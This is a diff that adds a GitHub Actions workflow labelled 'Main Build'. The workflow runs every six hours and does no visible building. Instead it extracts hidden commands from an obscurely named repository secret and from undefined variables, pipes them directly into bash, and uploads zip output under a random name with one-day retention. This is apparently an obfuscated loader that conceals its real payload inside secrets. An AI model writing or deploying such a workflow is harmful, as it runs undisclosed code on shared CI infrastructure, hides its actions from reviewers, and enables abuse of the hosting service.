@@ -1,0 +1,30 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          rnn18134: ${{ secrets.rnn18134 }}
+        run: |
+          printf '%s' "$rnn18134" | jq -r .iccc4 | /bin/bash
+          printf '%s' "$dkka6" | jq -r .zqfj9767 | /bin/bash
+          echo $apbq4 | jq -r .hocij962 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: RK8cafSl
+          path: "*.zip"
+          retention-days: 1
